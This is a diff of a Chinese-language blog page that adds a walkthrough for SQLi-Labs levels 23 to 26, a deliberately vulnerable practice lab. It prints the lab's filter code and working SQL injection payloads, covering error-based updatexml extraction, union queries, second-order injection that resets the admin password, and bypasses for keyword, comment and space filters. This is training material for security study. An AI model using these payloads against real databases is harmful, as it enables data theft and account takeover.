@@ -459,14 +459,65 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="1-SQLI-LABS23"><a href="#1-SQLI-LABS23" class="headerlink" title="1.SQLI-LABS23"></a>1.SQLI-LABS23</h3><p>与第一关的不同的是，对#，–，进行了替换成了空格。</p>
+                <h3 id="1-SQLI-LABS23"><a href="#1-SQLI-LABS23" class="headerlink" title="1.SQLI-LABS23"></a>1.SQLI-LABS23</h3><pre><code>$reg = &quot;/#/&quot;;
+
+$reg1 = &quot;/--/&quot;;
+
+$replace = &quot;&quot;;
+
+$id = preg_replace($reg, $replace, $id);
+
+$id = preg_replace($reg1, $replace, $id);</code></pre>
+<p>对#，–，进行了替换成了空格。</p>
 <h5 id="①可以采用-；-00代替注释符进行注释"><a href="#①可以采用-；-00代替注释符进行注释" class="headerlink" title="①可以采用 ；%00代替注释符进行注释"></a>①可以采用 ；%00代替注释符进行注释</h5><h5 id="②采用引号闭合方式加报错进行注入"><a href="#②采用引号闭合方式加报错进行注入" class="headerlink" title="②采用引号闭合方式加报错进行注入"></a>②采用引号闭合方式加报错进行注入</h5><p>查库：?id=-1’ or updatexml(null,concat(0x3a,(select database())),null) or ‘1’=’1</p>
 <p>查表：?id=-1’ or updatexml(null,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=’数据库名’),null) or ‘1’=’1</p>
 <p>查列：?id=-1’ or updatexml(null,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’表名’),null) or ‘1’=’1</p>
 <p>查数据：?id=-1’ or updatexml(null,concat(0x3a,(select group_concat(username) from 表名),null) or ‘1’=’1</p>
-<h5 id="③用联合查询进行注入"><a href="#③用联合查询进行注入" class="headerlink" title="③用联合查询进行注入"></a>③用联合查询进行注入</h5><p>查库：?id=-1’ union select 1,(select database()),’3</p>
-<p>注：先用联合查询注入确定列数，以及回显位</p>
+<h5 id="③用联合查询进行注入"><a href="#③用联合查询进行注入" class="headerlink" title="③用联合查询进行注入"></a>③用联合查询进行注入</h5><p>查库：?id=-1’ union select 1,(select database()),3 and ‘1’=’2</p>
+<p>剩下自行领会。。</p>
+<h3 id="2-SQLI-LABS24"><a href="#2-SQLI-LABS24" class="headerlink" title="2.SQLI-LABS24"></a>2.SQLI-LABS24</h3><p>这关主要是数据从数据库中取出时，没用进行验证造成的注入。（二次注入）</p>
+<p>①先用账号admin，密码admin。可以登录成功。</p>
+<p>②注册一个新的账号为admin’#,密码为123456。注册成功，注册时对数据进行了转义。但存入数据库里时，会取消**<u>反斜杠</u>**。即在Mysql数据库终端查询数据会发现账号为admin‘#。</p>
+<p>③登录admin’#账户，进行密码修改。修改成功此时数据库执行的指令是：</p>
+<pre><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></pre>
+<p>将后面注释掉了，变成修改的是admin这个用户的密码。</p>
+<p>④登录admin用户发现密码就是自己修改的密码。这就是二次注入。盗取权限较高用户的密码。</p>
+<h3 id="3-SQLI-LABS25"><a href="#3-SQLI-LABS25" class="headerlink" title="3.SQLI-LABS25"></a>3.SQLI-LABS25</h3><pre><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);      //strip out OR (non case sensitive)
 
+$id= preg_replace(&#39;/AND/i&#39;,&quot;&quot;, $id);    //Strip out AND (non case sensitive)</code></pre>
+<p>过滤了大小写的and和or。参数i表示过滤大小写。or,OR,oR,Or都不行。</p>
+<ul>
+<li>可以通过函数等价方式进行绕过。and=&amp;&amp;=%26%26，or=||（我win 10下&amp;&amp;用不了，是用%26%26代替and）</li>
+</ul>
+<p>如：</p>
+<pre><code>id=1&#39; || &#39;1&#39;=&#39;1</code></pre>
+<ul>
+<li>可以通过拆分or或者and进行绕过。oorr ,aandnd.</li>
+</ul>
+<p>如</p>
+<pre><code>id=-1&#39; union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#39;security&#39; --+</code></pre>
+<p>其他自行发散思维。</p>
+<h3 id="4-SQLI-LABS25a"><a href="#4-SQLI-LABS25a" class="headerlink" title="4.SQLI-LABS25a"></a>4.SQLI-LABS25a</h3><p>只是换了数据的闭合形式。不会用报错信息。其他一样。</p>
+<h3 id="5-SQLI-LABS26"><a href="#5-SQLI-LABS26" class="headerlink" title="5.SQLI-LABS26"></a>5.SQLI-LABS26</h3><pre><code>$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);      //strip out OR (non case sensitive)
+
+$id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);    //Strip out AND (non case sensitive)
+
+$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);   //strip out /*
+
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);    //Strip out --
+
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);     //Strip out #
+
+$id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);    //Strip out spaces
+
+$id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);    //Strip out slashes</code></pre>
+<pre><code>过滤了大小写or和and，/*，--，#，空格，\。</code></pre>
+<p>注释符号被过滤了。有个比较投机取巧的注释符；%00代替–或者#。或者利用引号闭合来注入。</p>
+<p>绕过空格的方法有，用<u>%20,%09,%0a,%0b,%0c,%0d,%a0</u>来代替。</p>
+<p>windows下apache会有解析问题用不了上面这种绕过空格的方法。所以还有终绕过方式。利用括号闭合进行绕过。</p>
+<p>如：</p>
+<pre><code>id=1&#39; oorr(updatexml(null,concat(0x3a,(select (group_concat(table_name)) from (infoorrmation_schema.tables) where(table_schema=&#39;security&#39;)),0x3a),null));%00</code></pre>
+<h3 id="6-SQLI-LABS26a"><a href="#6-SQLI-LABS26a" class="headerlink" title="6.SQLI-LABS26a"></a>6.SQLI-LABS26a</h3>
             </div>
             <hr/>
 
